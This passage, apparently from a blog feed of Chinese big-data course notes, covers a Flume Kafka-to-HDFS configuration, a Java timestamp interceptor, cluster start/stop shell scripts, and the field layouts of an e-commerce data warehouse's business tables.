/opt/module/flume/data/behavior1/</p><p>a1.channels.c1.maxFileSize = 2146435071</p><p>a1.channels.c1.capacity = 1000000</p><p>a1.channels.c1.keep-alive = 6</p><p>#### sink1</p><p>a1.sinks.k1.type = hdfs</p><p>a1.sinks.k1.hdfs.path = /origin_data/gmall/log/topic_log/%Y-%m-%d</p><p>a1.sinks.k1.hdfs.filePrefix = log-</p><p>a1.sinks.k1.hdfs.rollInterval = 10</p><p>a1.sinks.k1.hdfs.rollSize = 134217728</p><p>a1.sinks.k1.hdfs.rollCount = 0</p><p>#### 控制输出文件是原生文件。</p><p>a1.sinks.k1.hdfs.fileType = CompressedStream</p><p>a1.sinks.k1.hdfs.codeC = gzip</p><p>#### 拼装</p><p>a1.sources.r1.channels = c1</p><p>a1.sinks.k1.channel= c1</p><p><strong>注：配置优化</strong></p><p>1）FileChannel优化</p><p>通过配置dataDirs指向多个路径，每个路径对应不同的硬盘，增大Flume吞吐量。</p><p>官方说明如下：</p><p>Comma separated list of directories for storing log files. Using multiple<br>directories on separate disks can improve file channel peformance</p><p>checkpointDir和backupCheckpointDir也尽量配置在不同硬盘对应的目录中，保证checkpoint坏掉后，可以快速使用backupCheckpointDir恢复数据</p><p>2）HDFS Sink优化</p><p>（1）HDFS存入大量小文件，有什么影响？</p><p><strong>元数据层面：</strong>每个小文件都有一份元数据，其中包括文件路径，文件名，所有者，所属组，权限，创建时间等，这些信息都保存在Namenode内存中。所以小文件过多，会占用Namenode服务器大量内存，影响Namenode性能和使用寿命</p><p><strong>计算层面：</strong>默认情况下MR会对每个小文件启用一个Map任务计算，非常影响计算性能。同时也影响磁盘寻址时间。</p><p>（2）HDFS小文件处理</p><p>官方默认的这三个参数配置写入HDFS后会产生小文件，hdfs.rollInterval、hdfs.rollSize、hdfs.rollCount</p><p>基于以上hdfs.rollInterval=3600，hdfs.rollSize=134217728，hdfs.rollCount<br>=0几个参数综合作用，效果如下：</p><p>（1）文件在达到128M时会滚动生成新文件</p><p>（2）文件创建超3600秒时会滚动生成新文件</p><p><strong>3）编写Flume拦截器</strong></p><p>（1）在com.atguigu.flume.interceptor包下创建TimeStampInterceptor类</p><p>package com.atguigu.flume.interceptor;</p><p>import com.alibaba.fastjson.JSONObject;</p><p>import org.apache.flume.Context;</p><p>import org.apache.flume.Event;</p><p>import org.apache.flume.interceptor.Interceptor;</p><p>import java.nio.charset.StandardCharsets;</p><p>import java.util.List;</p><p>import java.util.Map;</p><p>public class TimeStampInterceptor implements Interceptor {</p><p>@Override</p><p>public void initialize() {</p><p>}</p><p>@Override</p><p>public Event intercept(Event event) {</p><p>Map&lt;String, String&gt; headers = event.getHeaders();</p><p>String log = new String(event.getBody(), StandardCharsets.UTF_8);</p><p>JSONObject jsonObject = JSONObject.parseObject(log);</p><p>String ts = jsonObject.getString(“ts”);</p><p>headers.put(“timestamp”, ts);</p><p>return event;</p><p>}</p><p>@Override</p><p>public List&lt;Event&gt; intercept(List&lt;Event&gt; events) {</p><p>for (Event event : events) {</p><p>intercept(event);</p><p>}</p><p>return events;</p><p>}</p><p>@Override</p><p>public void close() {</p><p>}</p><p>public static class Builder implements Interceptor.Builder {</p><p>@Override</p><p>public Interceptor build() {</p><p>return new TimeStampInterceptor();</p><p>}</p><p>@Override</p><p>public void configure(Context context) {</p><p>}</p><p>}</p><p>}</p><p>（2）重新打包</p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/361c38002f9891ce01e4771948d70b01.png" alt="图片包含 图形用户界面描述已自动生成"></p><p>3）需要先将打好的包放入到hadoop104的/opt/module/flume/lib文件夹下面。</p><h4 id="日志消费Flume测试"><a href="#日志消费Flume测试" class="headerlink" title="日志消费Flume测试"></a>日志消费Flume测试</h4><p><strong>1）启动Zookeeper、Kafka集群</strong></p><p><strong>2）启动日志采集Flume</strong></p><p>[atguigu@hadoop102 ~]$ f1.sh start</p><p><strong>3）启动hadoop104的日志消费Flume</strong></p><p>[atguigu@hadoop104 flume]$ bin/flume-ng agent -n a1 -c conf/ -f<br>job/kafka_to_hdfs.conf -Dflume.root.logger=info,console</p><p><strong>4）生成模拟数据</strong></p><p>[atguigu@hadoop102 ~]$ lg.sh</p><p><strong>5）观察HDFS是否出现数据</strong></p><h4 id="日志消费Flume启停脚本"><a href="#日志消费Flume启停脚本" class="headerlink" title="日志消费Flume启停脚本"></a>日志消费Flume启停脚本</h4><p>若上述测试通过，为方便，此处创建一个Flume的启停脚本。</p><p><strong>1）在hadoop102节点的/home/atguigu/bin目录下创建脚本f2.sh</strong></p><p>[atguigu@hadoop102 bin]$ vim f2.sh</p><p>在脚本中填写如下内容</p><p>##!/bin/bash</p><p>case $1 in</p><p>“start”)</p><p>echo “ ——–启动 hadoop104 日志数据flume——-“</p><p>ssh hadoop104 “nohup /opt/module/flume/bin/flume-ng agent -n a1 -c<br>/opt/module/flume/conf -f /opt/module/flume/job/kafka_to_hdfs.conf &gt;/dev/null<br>2&gt;&amp;1 &amp;”</p><p>;;</p><p>“stop”)</p><p>echo “ ——–停止 hadoop104 日志数据flume——-“</p><p>ssh hadoop104 “ps -ef | grep kafka_to_hdfs.conf | grep -v grep |awk ‘{print<br>\$2}’ | xargs -n1 kill”</p><p>;;</p><p>esac</p><p><strong>2）增加脚本执行权限</strong></p><p>[atguigu@hadoop102 bin]$ chmod +x f2.sh</p><p><strong>3）f2启动</strong></p><p>[atguigu@hadoop102 module]$ f2.sh start</p><p><strong>4）f2停止</strong></p><p>[atguigu@hadoop102 module]$ f2.sh stop</p><h3 id="采集通道启动-停止脚本"><a href="#采集通道启动-停止脚本" class="headerlink" title="采集通道启动/停止脚本"></a>采集通道启动/停止脚本</h3><p>1）在/home/atguigu/bin目录下创建脚本cluster.sh</p><p>[atguigu@hadoop102 bin]$ vim cluster.sh</p><p>在脚本中填写如下内容</p><p>##!/bin/bash</p><p>case $1 in</p><p>“start”){</p><p>echo ================== 启动 集群 ==================</p><p>##启动 Zookeeper集群</p><p>zk.sh start</p><p>##启动 Hadoop集群</p><p>myhadoop.sh start</p><p>##启动 Kafka采集集群</p><p>kf.sh start</p><p>##启动 Flume采集集群</p><p>f1.sh start</p><p>##启动 Flume消费集群</p><p>f2.sh start</p><p>};;</p><p>“stop”){</p><p>echo ================== 停止 集群 ==================</p><p>##停止 Flume消费集群</p><p>f2.sh stop</p><p>##停止 Flume采集集群</p><p>f1.sh stop</p><p>##停止 Kafka采集集群</p><p>kf.sh stop</p><p>##停止 Hadoop集群</p><p>myhadoop.sh stop</p><p>##停止 Zookeeper集群</p><p>zk.sh stop</p><p>};;</p><p>esac</p><p>2）增加脚本执行权限</p><p>[atguigu@hadoop102 bin]$ chmod +x cluster.sh</p><p>3）cluster集群启动脚本</p><p>[atguigu@hadoop102 module]$ cluster.sh start</p><p>4）cluster集群停止脚本</p><p>[atguigu@hadoop102 module]$ cluster.sh stop</p>]]></content>
      
      
      <categories>
          
          <category> 项目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据仓库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>尚硅谷大数据项目之电商数仓（业务数据采集平台）V5.0</title>
      <link href="/2022/01/22/%E5%B0%9A%E7%A1%85%E8%B0%B7%E5%A4%A7%E6%95%B0%E6%8D%AE%E9%A1%B9%E7%9B%AE%E4%B9%8B%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%93%EF%BC%88%E4%B8%9A%E5%8A%A1%E6%95%B0%E6%8D%AE%E9%87%87%E9%9B%86%E5%B9%B3%E5%8F%B0%EF%BC%89V5.0/"/>
      <url>/2022/01/22/%E5%B0%9A%E7%A1%85%E8%B0%B7%E5%A4%A7%E6%95%B0%E6%8D%AE%E9%A1%B9%E7%9B%AE%E4%B9%8B%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%93%EF%BC%88%E4%B8%9A%E5%8A%A1%E6%95%B0%E6%8D%AE%E9%87%87%E9%9B%86%E5%B9%B3%E5%8F%B0%EF%BC%89V5.0/</url>
      
        <content type="html"><![CDATA[<p>尚硅谷大数据项目之电商数仓（业务数据采集平台）</p><p>(作者：尚硅谷大数据研发部)</p><p>版本：V5.0</p><h2 id="第1章-电商业务简介"><a href="#第1章-电商业务简介" class="headerlink" title="第1章 电商业务简介"></a>第1章 电商业务简介</h2><h3 id="电商业务流程"><a href="#电商业务流程" class="headerlink" title="电商业务流程"></a>电商业务流程</h3><p>电商的业务流程可以以一个普通用户的浏览足迹为例进行说明，用户点开电商首页开始浏览，可能会通过分类查询也可能通过全文搜索寻找自己中意的商品，这些商品无疑都是存储在后台的管理系统中的。</p><p>当用户寻找到自己中意的商品，可能会想要购买，将商品添加到购物车后发现需要登录，登录后对商品进行结算，这时候购物车的管理和商品订单信息的生成都会对业务数据库产生影响，会生成相应的订单数据和支付数据。</p><p>订单正式生成之后，还会对订单进行跟踪处理，直到订单全部完成。</p><p>电商的主要业务流程包括用户前台浏览商品时的商品详情的管理，用户商品加入购物车进行支付时用户个人中心&amp;支付服务的管理，用户支付完成后订单后台服务的管理，这些流程涉及到了十几个甚至几十个业务数据表，甚至更多。</p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/e9ecb894ec58b2efc013bb4e9c5088a0.jpeg"></p><h3 id="电商常识"><a href="#电商常识" class="headerlink" title="电商常识"></a>电商常识</h3><h4 id="SKU和SPU"><a href="#SKU和SPU" class="headerlink" title="SKU和SPU"></a>SKU和SPU</h4><p>SKU=Stock Keeping<br>Unit（库存量基本单位）。现在已经被引申为产品统一编号的简称，每种产品均对应有唯一的SKU号。</p><p>SPU（Standard Product<br>Unit）：是商品信息聚合的最小单位，是一组可复用、易检索的标准化信息集合。</p><p>例如：iPhoneX手机就是SPU。一台银色、128G内存的、支持联通网络的iPhoneX，就是SKU。</p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/024d35ea94cc5e0654eed23f45079247.png"></p><p>SPU表示一类商品。同一SPU的商品可以共用商品图片、海报、销售属性等。</p><h4 id="平台属性和销售属性"><a href="#平台属性和销售属性" class="headerlink" title="平台属性和销售属性"></a>平台属性和销售属性</h4><p><strong>1.平台属性</strong></p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/8795580dd3db783c3cd0b15197cf94fa.png"></p><p><strong>2.销售属性</strong></p><p><img src="http://106.12.125.218/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/0da04f4fa079a4754c9bd33e30eae808.png"></p><h2 id="第2章-电商业务数据"><a href="#第2章-电商业务数据" class="headerlink" title="第2章 电商业务数据"></a>第2章 电商业务数据</h2><h3 id="电商系统表结构"><a href="#电商系统表结构" class="headerlink" title="电商系统表结构"></a>电商系统表结构</h3><p>以下为本电商数仓系统涉及到的业务数据表结构关系。这34个表以订单表、用户表、SKU商品表、活动表和优惠券表为中心，延伸出了优惠券领用表、支付流水表、活动订单表、订单详情表、订单状态表、商品评论表、编码字典表退单表、SPU商品表等，用户表提供用户的详细信息，支付流水表提供该订单的支付详情，订单详情表提供订单的商品数量等情况，商品表给订单详情表提供商品的详细信息。本次讲解以此34个表为例，实际项目中，业务数据库中表格远远不止这些。</p><h4 id="活动信息表（activity-info）"><a href="#活动信息表（activity-info）" class="headerlink" title="活动信息表（activity_info）"></a>活动信息表（activity_info）</h4><table><thead><tr><th>字段名</th><th>字段说明</th></tr></thead><tbody><tr><td>id</td><td>活动id</td></tr><tr><td>activity_name</td><td>活动名称</td></tr><tr><td>activity_type</td><td>活动类型（1：满减，2：折扣）</td></tr><tr><td>activity_desc</td><td>活动描述</td></tr><tr><td>start_time</td><td>开始时间</td></tr><tr><td>end_time</td><td>结束时间</td></tr><tr><td>create_time</td><td>创建时间</td></tr></tbody></table><h4 id="活动规则表（activity-rule）"><a href="#活动规则表（activity-rule）" class="headerlink" title="活动规则表（activity_rule）"></a>活动规则表（activity_rule）</h4><table><thead><tr><th>id</th><th>编号</th></tr></thead><tbody><tr><td>activity_id</td><td>活动ID</td></tr><tr><td>activity_type</td><td>活动类型</td></tr><tr><td>condition_amount</td><td>满减金额</td></tr><tr><td>condition_num</td><td>满减件数</td></tr><tr><td>benefit_amount</td><td>优惠金额</td></tr><tr><td>benefit_discount</td><td>优惠折扣</td></tr><tr><td>benefit_level</td><td>优惠级别</td></tr></tbody></table><h4 id="活动商品关联表（activity-sku）"><a href="#活动商品关联表（activity-sku）" class="headerlink" title="活动商品关联表（activity_sku）"></a>活动商品关联表（activity_sku）</h4><table><thead><tr><th>字段名</th><th>字段说明</th></tr></thead><tbody><tr><td>id</td><td>编号</td></tr><tr><td>activity_id</td><td>活动id</td></tr><tr><td>sku_id</td><td>sku_id</td></tr><tr><td>create_time</td><td>创建时间</td></tr></tbody></table><h4 id="平台属性表（base-attr-info）"><a href="#平台属性表（base-attr-info）" class="headerlink" title="平台属性表（base_attr_info）"></a>平台属性表（base_attr_info）</h4><table><thead><tr><th>字段名</th><th>字段说明</th></tr></thead><tbody><tr><td>id</td><td>编号</td></tr><tr><td>attr_name</td><td>属性名称</td></tr><tr><td>category_id</td><td>分类id</td></tr><tr><td>category_level</td><td>分类层级</td></tr></tbody></table><h4 id="平台属性值表（base-attr-value）"><a href="#平台属性值表（base-attr-value）" class="headerlink" title="平台属性值表（base_attr_value）"></a>平台属性值表（base_attr_value）</h4><table><thead><tr><th>字段名</th><th>字段说明</th></tr></thead><tbody><tr><td>id</td><td>编号</td></tr><tr><td>value_name</td><td>属性值名称</td></tr><tr><td>attr_id</td><td>属性id</td></tr></tbody></table><h4 id="一级分类表（base-category1）"><a href="#一级分类表（base-category1）" class="headerlink" title="一级分类表（base_category1）"></a>一级分类表（base_category1）</h4><table><thead><tr><th>字段名</th><th>字段说明</th></tr></thead><tbody><tr><td>id</td><td>编号</td></tr><tr><td>name</td><td>分类名称</td></tr></tbody></table><h4 id="二级分类表（base-category2）"><a href="#二级分类表（base-category2）" class="headerlink" title="二级分类表（base_category2）"></a>二级分类表（base_category2）</h4><table><thead><tr><th>字段名</th><th>字段说明</th></tr></thead><tbody><tr><td>id</td><td>编号</td></tr><tr><td>name</td><td>二级分类名称</td></tr><tr><td>category1_id</td><td>一级分类编号</td></tr></tbody></table><h4 id="三级分类表（base-category3）"><a href="#三级分类表（base-category3）" class="headerlink" title="三级分类表（base_category3）"></a>三级分类表（base_category3）</h4><table><thead><tr><th>字段名</th><th>字段说明</th></tr></thead><tbody><tr><td>id</td><td>编号</td></tr><tr><td>name</td><td>三级分类名称</td></tr><tr><td>category2_id</td><td>二级分类编号</td></tr></tbody></table><h4 id="字典表（base-dic）"><a href="#字典表（base-dic）" class="headerlink" title="字典表（base_dic）"></a>字典表（base_dic）</h4><table><thead><tr><th>字段名</th><th>字段说明</th></tr></thead><tbody><tr><td>dic_code</td><td>编号</td></tr><tr><td>dic_name</td><td>编码名称</td></tr><tr><td>parent_code</td><td>父编号</td></tr><tr><td>create_time</td><td>创建日期</td></tr><tr><td>operate_time</td><td>修改日期</td></tr></tbody></table><h4 id="省份表（base-province）"><a href="#省份表（base-province）" class="headerlink" title="省份表（base_province）"></a>省份表（base_province）</h4><table><thead><tr><th>字段名</th><th>字段说明</th></tr></thead><tbody><tr><td>id</td><td>id</td></tr><tr><td>name</td><td>省名称</td></tr><tr><td>region_id</td><td>大区id</td></tr><tr><td>area_code</td><td>行政区位码</td></tr><tr><td>iso_code</td><td>国际编码</td></tr><tr><td>iso_3166_2</td><td>ISO3166编码</td></tr></tbody></table><h4 id="地区表（base-region）"><a href="#地区表（base-region）" class="headerlink" title="地区表（base_region）"></a>地区表（base_region）</h4><table><thead><tr><th>字段名</th><th>字段说明</th></tr></thead><tbody><tr><td>id</td><td>大区id</td></tr><tr><td>region_name</td><td>大区名称</td></tr></tbody></table><h4 id="品牌表（base-trademark）"><a href="#品牌表（base-trademark）" class="headerlink" title="品牌表（base_trademark）"></a>品牌表（base_trademark）</h4><table><thead><tr><th>字段名</th><th>字段说明</th></tr></thead><tbody><tr><td>id</td><td>编号</td></tr><tr><td>tm_name</td><td>属性值</td></tr><tr><td>logo_url</td><td>品牌logo的图片路径</td></tr></tbody></table><h4 id="购物车表（cart-info）"><a href="#购物车表（cart-info）" class="headerlink" title="购物车表（cart_info）"></a>购物车表（cart_info）</h4><table><thead><tr><th>字段名</th><th>字段说明</th></tr></thead><tbody><tr><td>id</td><td>编号</td></tr><tr><td>user_id</td><td>用户id</td></tr><tr><td>sku_id</td><td>skuid</td></tr><tr><td>cart_price</td><td>放入购物车时价格</td></tr><tr><td>sku_num</td><td>数量</td></tr><tr><td>img_url</td><td>图片文件</td></tr><tr><td>sku_name</td><td>sku名称 (冗余)</td></tr><tr><td>is_checked</td><td></td></tr><tr><td>create_time</td><td>创建时间</td></tr><tr><td>operate_time</td><td>修改时间</td></tr><tr><td>is_ordered</td><td>是否已经下单</td></tr><tr><td>order_time</td><td>下单时间</td></tr><tr><td>source_type</td><td>来源类型</td></tr><tr><td>source_id</td><td>来源编号</td></tr></tbody></table><h4 id="评价表（comment-info）"><a href="#评价表（comment-info）" class="headerlink" title="评价表（comment_info）"></a>评价表（comment_info）</h4><table><thead><tr><th>字段名</th><th>字段说明</th></tr></thead><tbody><tr><td>id</td><td>编号</td></tr><tr><td>user_id</td><td>用户id</td></tr><tr><td>nick_name</td><td>用户昵称</td></tr><tr><td>head_img</td><td></td></tr><tr><td>sku_id</td><td>skuid</td></tr><tr><td>spu_id</td><td>商品id</td></tr><tr><td>order_id</td><td>订单编号</td></tr><tr><td>appraise</td><td>评价 1 好评 2 中评 3 差评</td></tr><tr><td>comment_txt</td><td>评价内容</td></tr><tr><td>create_time</td><td>创建时间</td></tr><tr><td>operate_time</td><td>修改时间</td></tr></tbody></table><h4 id="优惠券信息表（coupon-info）"><a href="#优惠券信息表（coupon-info）" class="headerlink" title="优惠券信息表（coupon_info）"></a>优惠券信息表（coupon_info）</h4><table><thead><tr><th>字段名</th><th>字段说明</th></tr></thead><tbody><tr><td>id</td><td>购物券编号</td></tr><tr><td>coupon_name</td><td>购物券名称</td></tr><tr><td>coupon_type</td><td>购物券类型 1 现金券 2 折扣券 3 满减券 4 满件打折券</td></tr><tr><td>condition_amount</td><td>满额数（3）</td></tr><tr><td>condition_num</td><td>满件数（4）</td></tr><tr><td>activity_id</td><td>活动编号</td></tr><tr><td>benefit_amount</td><td>减金额（1 3）</td></tr><tr><td>benefit_discount</td><td>折扣（2 4）</td></tr><tr><td>create_time</td><td>创建时间</td></tr><tr><td>range_type</td><td>范围类型 1、商品(spuid) 2、品类(三级分类id) 3、品牌</td></tr><tr><td>limit_num</td><td>最多领用次数</td></tr><tr><td>taken_count</td><td>已领用次数</td></tr><tr><td>start_time</td><td>可以领取的开始日期</td></tr><tr><td>end_time</td><td>可以领取的结束日期</td></tr><tr><td>operate_time</td><td>修改时间</td></tr><tr><td>expire_time</td><td>过期时间</td></tr><tr><td>range_desc</td><td>范围描述</td></tr></tbody></table><h4 id="优惠券优惠范围表（coupon-range）"><a href="#优惠券优惠范围表（coupon-range）" class="headerlink" title="优惠券优惠范围表（coupon_range）"></a>优惠券优惠范围表（coupon_range）</h4><table><thead><tr><th>字段名</th><th>字段说明</th></tr></thead><tbody><tr><td>id</td><td>购物券编号</td></tr><tr><td>coupon_id</td><td>优惠券id</td></tr><tr><td>range_type</td><td>范围类型 1、商品(spuid) 2、品类(三级分类id) 3、品牌</td></tr><tr><td>range_id</td><td></td></tr></tbody></table><h4 id="优惠券领用表（coupon-use）"><a href="#优惠券领用表（coupon-use）" class="headerlink" title="优惠券领用表（coupon_use）"></a>优惠券领用表（coupon_use）</h4><table><thead><tr><th>字段名</th><th>字段说明</th></tr></thead><tbody><tr><td>id</td><td>编号</td></tr><tr><td>coupon_id</td><td>购物券ID</td></tr><tr><td>user_id</td><td>用户ID</td></tr><tr><td>order_id</td><td>订单ID</td></tr><tr><td>coupon_status</td><td>购物券状态（1：未使用 2：已使用）</td></tr><tr><td>get_time</td><td>获取时间</td></tr><tr><td>using_time</td><td>使用时间</td></tr><tr><td>used_time</td><td>支付时间</td></tr><tr><td>expire_time</td><td>过期时间</td></tr></tbody></table><h4 id="收藏表（favor-info）"><a href="#收藏表（favor-info）" class="headerlink" title="收藏表（favor_info）"></a>收藏表（favor_info）</h4><table><thead><tr><th>字段名</th><th>字段说明</th></tr></thead><tbody><tr><td>id</td><td>编号</td></tr><tr><td>user_id</td><td>用户名称</td></tr><tr><td>sku_id</td><td>skuid</td></tr><tr><td>spu_id</td><td>商品id</td></tr><tr><td>is_cancel</td><td>是否已取消 0 正常 1 已取消</td></tr><tr><td>create_time</td><td>创建时间</td></tr><tr><td>cancel_time</td><td>修改时间</td></tr></tbody></table><h4 id="订单明细表（order-detail）"><a href="#订单明细表（order-detail）" class="headerlink" title="订单明细表（order_detail）"></a>订单明细表（order_detail）</h4><table><thead><tr><th>字段名</th><th>字段说明</th></tr></thead><tbody><tr><td>id</td><td>编号</td></tr><tr><td>order_id</td><td>订单编号</td></tr><tr><td>sku_id</td><td>sku_id</td></tr><tr><td>sku_name</td><td>sku名称（冗余)</td></tr><tr><td>img_url</td><td>图片名称（冗余)</td></tr><tr><td>order_price</td><td>购买价格(下单时sku价格）</td></tr><tr><td>sku_num</td><td>购买个数</td></tr><tr><td>create_time</td><td>创建时间</td></tr><tr><td>source_type</td><td>来源类型</td></tr><tr><td>source_id</td><td>来源编号</td></tr><tr><td>split_total_amount</td><td>分摊总金额</td></tr><tr><td>split_activity_amount</td><td>分摊活动减免金额</td></tr><tr><td>split_coupon_amount</td><td>分摊优惠券减免金额</td></tr></tbody></table><h4 id="订单明细活动关联表（order-detail-activity）"><a href="#订单明细活动关联表（order-detail-activity）" class="headerlink" title="订单明细活动关联表（order_detail_activity）"></a>订单明细活动关联表（order_detail_activity）</h4><table><thead><tr><th>字段名</th><th>字段说明</th></tr></thead><tbody><tr><td>id</td><td>编号</td></tr><tr><td>order_id</td><td>订单id</td></tr><tr><td>order_detail_id</td><td>订单明细id</td></tr><tr><td>activity_id</td><td>活动ID</td></tr><tr><td>activity_rule_id</td><td>活动规则</td></tr><tr><td>sku_id</td><td>skuID</td></tr><tr><td>create_time</td><td>获取时间</td></tr></tbody></table><h4 id="订单明细优惠券关联表（order-detail-coupon）"><a href="#订单明细优惠券关联表（order-detail-coupon）" class="headerlink" title="订单明细优惠券关联表（order_detail_coupon）"></a>订单明细优惠券关联表（order_detail_coupon）</h4><table><thead><tr><th>字段名</th><th>字段说明</th></tr></thead><tbody><tr><td>id</td><td>编号</td></tr><tr><td>order_id</td><td>订单id</td></tr><tr><td>order_detail_id</td><td>订单明细id</td></tr><tr><td>coupon_id</td><td>购物券ID</td></tr><tr><td>coupon_use_id</td><td>购物券领用id</td></tr><tr><td>sku_id</td><td>skuID</td></tr><tr><td>create_time</td><td>获取时间</td></tr></tbody></table><h4 id="订单表-order-info）"><a href="#订单表-order-info）" class="headerlink" title="订单表(order_info）"></a>订单表(order_info）</h4><table><thead><tr><th>字段名</th><th>字段说明</th></tr></thead><tbody><tr><td>id</td><td>编号</td></tr><tr><td>consignee</td><td>收货人</td></tr><tr><td>consignee_tel</td><td>收件人电话</td></tr><tr><td>total_amount</td><td>总金额</td></tr><tr><td>order_status</td><td>订单状态</td></tr><tr><td>user_id</td><td>用户id</td></tr><tr><td>payment_way</td><td>付款方式</td></tr><tr><td>delivery_address</td><td>送货地址</td></tr><tr><td>order_comment</td><td>订单备注</td></tr><tr><td>out_trade_no</td><td>订单交易编号（第三方支付用)</td></tr><tr><td>trade_body</td><td>订单描述(第三方支付用)</td></tr><tr><td>create_time</td><td>创建时间</td></tr><tr><td>operate_time</td><td>操作时间</td></tr><tr><td>expire_time</td><td>失效时间</td></tr><tr><td>process_status</td><td>进度状态</td></tr><tr><td>tracking_no</td><td>物流单编号</td></tr><tr><td>parent_order_id</td><td>父订单编号</td></tr><tr><td>img_url</td><td>图片路径</td></tr><tr><td>province_id</td><td>地区</td></tr><tr><td>activity_reduce_amount</td><td>促销金额</td></tr><tr><td>coupon_reduce_amount</td><td>优惠券</td></tr><tr><td>original_total_amount</td><td>原价金额</td></tr><tr><td>freight_fee</td><td>运费</td></tr><tr><td>freight_fee_reduce</td><td>运费减免</td></tr><tr><td>refundable_time</td><td>可退款日期（签收后30天）</td></tr></tbody></table><h4 id="退单表（order-refund-info）"><a href="#退单表（order-refund-info）" class="headerlink" title="退单表（order_refund_info）"></a>退单表（order_refund_info）</h4><table><thead><tr><th>字段名</th><th>字段说明</th></tr></thead><tbody><tr><td>id</td><td>编号</td></tr><tr><td>user_id</td><td>用户id</td></tr><tr><td>order_id</td><td>订单id</td></tr><tr><td>sku_id</td><td>skuid</td></tr><tr><td>refund_type</td><td>退款类型</td></tr><tr><td>refund_num</td><td>退货件数</td></tr><tr><td>refund_amount</td><td>退款金额</td></tr><tr><td>refund_reason_type</td><td>原因类型</td></tr><tr><td>refund_reason_txt</td><td>原因内容</td></tr><tr><td>refund_status</td><td>退款状态（0：待审批 1：已退款）</td></tr><tr><td>create_time</td><td>创建时间</td></tr></tbody></table><h4 id="订单状态流水表（order-status-log）"><a href="#订单状态流水表（order-status-log）" class="headerlink" title="订单状态流水表（order_status_log）"></a>订单状态流水表（order_status_log）</h4><table><thead><tr><th>字段名</th><th>字段说明</th></tr></thead><tbody><tr><td>id</td><td></td></tr><tr><td>order_id</td><td></td></tr><tr><td>order_status</td><td></td></tr><tr><td>operate_time</td><td></td></tr></tbody></table><h4 id="支付表（payment-info）"><a href="#支付表（payment-info）" class="headerlink" title="支付表（payment_info）"></a>支付表（payment_info）</h4><table><thead><tr><th>字段名</th><th>字段说明</th></tr></thead><tbody><tr><td>id</td><td>编号</td></tr><tr><td>out_trade_no</td><td>对外业务编号</td></tr><tr><td>order_id</td><td>订单编号</td></tr><tr><td>user_id</td><td></td></tr><tr><td>payment_type</td><td>支付类型（微信 支付宝）</td></tr><tr><td>trade_no</td><td>交易编号</td></tr><tr><td>total_amount</td><td>支付金额</td></tr><tr><td>subject</td><td>交易内容</td></tr><tr><td>payment_status</td><td>支付状态</td></tr><tr><td>create_time</td><td>创建时间</td></tr><tr><td>callback_time</td><td>回调时间</td></tr><tr><td>callback_content</td><td>回调信息</td></tr></tbody></table><h4 id="退款表（refund-payment）"><a href="#退款表（refund-payment）" class="headerlink" title="退款表（refund_payment）"></a>退款表（refund_payment）</h4><table><thead><tr><th>字段名</th><th>字段说明</th></tr></thead><tbody><tr><td>id</td><td>编号</td></tr><tr><td>out_trade_no</td><td>对外业务编号</td></tr><tr><td>order_id</td><td>订单编号</td></tr><tr><td>sku_id</td><td></td></tr><tr><td>payment_type</td><td>支付类型（微信 支付宝）</td></tr><tr><td>trade_no</td><td>交易编号</td></tr><tr><td>total_amount</td><td>退款金额</td></tr><tr><td>subject</td><td>交易内容</td></tr><tr><td>refund_status</td><td>退款状态</td></tr><tr><td>create_time</td><td>创建时间</td></tr><tr><td>callback_time</td><td>回调时间</td></tr><tr><td>callback_content</td><td>回调信息</td></tr></tbody></table><h4 id="SKU平台属性值表（sku-attr-value）"><a href="#SKU平台属性值表（sku-attr-value）" class="headerlink" title="SKU平台属性值表（sku_attr_value）"></a>SKU平台属性值表（sku_attr_value）</h4><table><thead><tr><th>字段名</th><th>字段说明</th></tr></thead><tbody><tr><td>id</td><td>编号</td></tr><tr><td>attr_id</td><td>属性id（冗余)</td></tr><tr><td>value_id</td><td>属性值id</td></tr><tr><td>sku_id</td><td>skuid</td></tr><tr><td>attr_name</td><td>属性名称</td></tr><tr><td>value_name</td><td>属性值名称</td></tr></tbody></table><h4 id="SKU信息表（sku-info）"><a href="#SKU信息表（sku-info）" class="headerlink" title="SKU信息表（sku_info）"></a>SKU信息表（sku_info）</h4><table><thead><tr><th>字段名</th><th>字段说明</th></tr></thead><tbody><tr><td>id</td><td>库存id(itemID)</td></tr><tr><td>spu_id</td><td>商品id</td></tr><tr><td>price</td><td>价格</td></tr><tr><td>sku_name</td><td>sku名称</td></tr><tr><td>sku_desc</td><td>商品规格描述</td></tr><tr><td>weight</td><td>重量</td></tr><tr><td>tm_id</td><td>品牌(冗余)</td></tr><tr><td>category3_id</td><td>三级分类id（冗余)</td></tr><tr><td>sku_default_img</td><td>默认显示图片(冗余)</td></tr><tr><td>is_sale</td><td>是否销售（1：是 0：否）</td></tr><tr><td>create_time</td><td>创建时间</td></tr></tbody></table><h4 id="SKU销售属性表（sku-sale-attr-value）"><a href="#SKU销售属性表（sku-sale-attr-value）" class="headerlink" title="SKU销售属性表（sku_sale_attr_value）"></a>SKU销售属性表（sku_sale_attr_value）</h4><table><thead><tr><th>字段名</th><th>字段说明</th></tr></thead><tbody><tr><td>id</td><td>id</td></tr><tr><td>sku_id</td><td>库存单元id</td></tr><tr><td>spu_id</td><td>spu_id(冗余)</td></tr><tr><td>sale_attr_value_id</td><td>销售属性值id</td></tr><tr><td>sale_attr_id</td><td></td></tr><tr><td>sale_attr_name</td><td></td></tr><tr><td>sale_attr_value_name</td><td></td></tr></tbody></table><h4 id="SPU信息表（spu-info）"><a href="#SPU信息表（spu-info）" class="headerlink" title="SPU信息表（spu_info）"></a>SPU信息表（spu_info）</h4><table><thead><tr><th>字段名</th><th>字段说明</th></tr></thead><tbody><tr><td>id</td><td>商品id</td></tr><tr><td>spu_name</td><td>商品名称</td></tr><tr><td>description</td><td>商品描述(后台简述）</td></tr><tr><td>category3_id</td><td>三级分类id</td></tr><tr><td>tm_id</td><td>品牌id</td></tr></tbody></table><h4 